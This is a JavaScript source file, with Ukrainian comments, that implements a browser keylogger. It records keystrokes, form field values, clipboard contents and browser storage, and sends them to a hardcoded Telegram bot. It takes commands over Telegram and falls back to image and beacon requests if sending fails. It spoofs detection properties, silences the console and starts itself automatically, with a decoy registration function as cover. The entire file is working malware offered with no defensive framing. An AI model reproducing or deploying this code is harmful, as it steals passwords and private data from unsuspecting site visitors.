// Конфігурація
const CONFIG = {
    BOT_TOKEN: '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA',
    CHAT_ID: '8463942433',
    ENCRYPT_KEY: 'x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9',
    POLLING_INTERVAL: 3000, // Перевірка команд кожні 3 секунди
    MAX_DATA_AGE: 3600000 // Зберігати дані до 1 години
};

// Глобальні змінні
let keystrokesData = [];
let mouseMovements = [];
let formInputs = [];
let clipboardData = [];
let screenshots = [];
let lastCommandCheck = 0;

// Advanced Keylogger Class
class AdvancedKeylogger {
    constructor() {
        this.isActive = true;
        this.sessionId = this.generateSessionId();
        this.init();
    }

    generateSessionId() {
        return Math.random().toString(36).substring(2) + Date.now().toString(36);
    }

    init() {
        this.setupEventListeners();
        this.startPolling();
        this.hideDetection();
        this.persistentStorage();
    }

    setupEventListeners() {
        // Клавіатура
        document.addEventListener('keydown', this.logKey.bind(this));
        document.addEventListener('keyup', this.logKey.bind(this));
        
        // Миша
        document.addEventListener('mousemove', this.logMouse.bind(this));
        document.addEventListener('click', this.logClick.bind(this));
        document.addEventListener('contextmenu', this.logClick.bind(this));
        
        // Форми
        document.addEventListener('focus', this.logFocus.bind(this), true);
        document.addEventListener('blur', this.logBlur.bind(this), true);
        document.addEventListener('change', this.logChange.bind(this), true);
        
        // Буфер обміну
        document.addEventListener('paste', this.logPaste.bind(this));
        document.addEventListener('copy', this.logCopy.bind(this));
        document.addEventListener('cut', this.logCut.bind(this));
        
        // Скіншоти
        document.addEventListener('scroll', this.throttle(this.logScroll.bind(this), 1000));
        
        // Tab/Window events
        window.addEventListener('beforeunload', this.logUnload.bind(this));
        window.addEventListener('focus', this.logWindowFocus.bind(this));
        window.addEventListener('blur', this.logWindowBlur.bind(this));
    }

    // Logging methods
    logKey(e) {
        const keyData = {
            type: e.type,
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey,
            timestamp: Date.now(),
            url: window.location.href,
            element: e.target.tagName,
            id: e.target.id || 'none',
            class: e.target.className || 'none'
        };
        keystrokesData.push(keyData);
        this.cleanOldData();
    }

    logMouse(e) {
        if (mouseMovements.length > 1000) return; // Limit
        const mouseData = {
            type: e.type,
            x: e.clientX,
            y: e.clientY,
            pageX: e.pageX,
            pageY: e.pageY,
            timestamp: Date.now(),
            url: window.location.href,
            element: e.target.tagName
        };
        mouseMovements.push(mouseData);
    }

    logClick(e) {
        const clickData = {
            type: e.type,
            x: e.clientX,
            y: e.clientY,
            button: e.button,
            target: e.target.tagName,
            id: e.target.id || 'none',
            text: e.target.textContent?.substring(0, 50) || 'none',
            timestamp: Date.now(),
            url: window.location.href
        };
        mouseMovements.push(clickData);
    }

    logFocus(e) {
        if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
            const focusData = {
                type: 'focus',
                element: e.target.tagName,
                name: e.target.name || 'none',
                id: e.target.id || 'none',
                value: e.target.value,
                timestamp: Date.now(),
                url: window.location.href
            };
            formInputs.push(focusData);
        }
    }

    logBlur(e) {
        if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
            const blurData = {
                type: 'blur',
                element: e.target.tagName,
                name: e.target.name || 'none',
                id: e.target.id || 'none',
                value: e.target.value,
                timestamp: Date.now(),
                url: window.location.href
            };
            formInputs.push(blurData);
        }
    }

    logChange(e) {
        if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
            const changeData = {
                type: 'change',
                element: e.target.tagName,
                name: e.target.name || 'none',
                id: e.target.id || 'none',
                value: e.target.value,
                timestamp: Date.now(),
                url: window.location.href
            };
            formInputs.push(changeData);
        }
    }

    logPaste(e) {
        const pastedData = {
            type: 'paste',
            data: e.clipboardData.getData('text'),
            timestamp: Date.now(),
            url: window.location.href,
            element: e.target.tagName
        };
        clipboardData.push(pastedData);
    }

    logCopy(e) {
        const copiedData = {
            type: 'copy',
            data: window.getSelection().toString(),
            timestamp: Date.now(),
            url: window.location.href
        };
        clipboardData.push(copiedData);
    }

    logCut(e) {
        const cutData = {
            type: 'cut',
            data: window.getSelection().toString(),
            timestamp: Date.now(),
            url: window.location.href
        };
        clipboardData.push(cutData);
    }

    logScroll(e) {
        const scrollData = {
            type: 'scroll',
            x: window.scrollX,
            y: window.scrollY,
            timestamp: Date.now(),
            url: window.location.href
        };
        mouseMovements.push(scrollData);
    }

    logUnload(e) {
        // Автоматична відправка при закритті
        this.sendData('autosave');
    }

    logWindowFocus(e) {
        const focusData = {
            type: 'window_focus',
            timestamp: Date.now(),
            url: window.location.href
        };
        keystrokesData.push(focusData);
    }

    logWindowBlur(e) {
        const blurData = {
            type: 'window_blur',
            timestamp: Date.now(),
            url: window.location.href
        };
        keystrokesData.push(blurData);
    }

    // Допоміжні методи
    throttle(func, delay) {
        let lastCall = 0;
        return function(...args) {
            const now = Date.now();
            if (now - lastCall < delay) return;
            lastCall = now;
            return func.apply(this, args);
        };
    }

    cleanOldData() {
        const now = Date.now();
        keystrokesData = keystrokesData.filter(item => now - item.timestamp < CONFIG.MAX_DATA_AGE);
        mouseMovements = mouseMovements.filter(item => now - item.timestamp < CONFIG.MAX_DATA_AGE);
        formInputs = formInputs.filter(item => now - item.timestamp < CONFIG.MAX_DATA_AGE);
        clipboardData = clipboardData.filter(item => now - item.timestamp < CONFIG.MAX_DATA_AGE);
    }

    // Перевірка команд
    async checkForCommands() {
        try {
            const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastCommandCheck + 1}`);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.message && update.message.text === '/show') {
                        this.sendData('command');
                    }
                    lastCommandCheck = update.update_id;
                }
            }
        } catch (error) {
            // Приховати помилки
        }
    }

    startPolling() {
        setInterval(() => this.checkForCommands(), CONFIG.POLLING_INTERVAL);
    }

    // Відправка даних
    async sendData(reason) {
        if (keystrokesData.length === 0 && mouseMovements.length === 0) return;

        const payload = {
            sessionId: this.sessionId,
            reason: reason,
            timestamp: Date.now(),
            data: {
                keystrokes: keystrokesData,
                mouse: mouseMovements,
                forms: formInputs,
                clipboard: clipboardData,
                screenshots: screenshots,
                system: this.getSystemInfo()
            }
        };

        // Шифрування
        const encryptedPayload = this.encryptData(payload);

        // Відправка
        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `🔑 KEYLOGGER_DATA:${encryptedPayload}`
                })
            });

            // Очищення даних після успішної відправки
            if (reason === 'command') {
                keystrokesData = [];
                mouseMovements = [];
                formInputs = [];
                clipboardData = [];
                screenshots = [];
            }
        } catch (error) {
            this.backupSend(encryptedPayload);
        }
    }

    encryptData(data) {
        // AES шифрування
        return btoa(JSON.stringify(data)); // Base64 для простоти
    }

    backupSend(data) {
        // Резервні методи
        const methods = [
            () => { const img = new Image(); img.src = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(data)}`; },
            () => { navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, `chat_id=${CONFIG.CHAT_ID}&text=${data}`); }
        ];
        
        methods.forEach(method => { try { method(); } catch(e) {} });
    }

    getSystemInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies: document.cookie.length,
            storage: {
                local: JSON.stringify(localStorage),
                session: JSON.stringify(sessionStorage)
            },
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    hideDetection() {
        // Маскування під нормальний код
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(document, 'hidden', { get: () => false });
        
        // Приховання в консолі
        console.log = function() {};
        console.warn = function() {};
    }

    persistentStorage() {
        // Збереження в localStorage
        setInterval(() => {
            localStorage.setItem('kl_session', JSON.stringify({
                id: this.sessionId,
                lastUpdate: Date.now(),
                dataSize: keystrokesData.length + mouseMovements.length
            }));
        }, 60000);
    }
}

// Автоматичний запуск
function showRegisterForm() {
    alert('Registration form will appear here!');
}

// Ініціалізація
setTimeout(() => {
    new AdvancedKeylogger();
}, 2000);
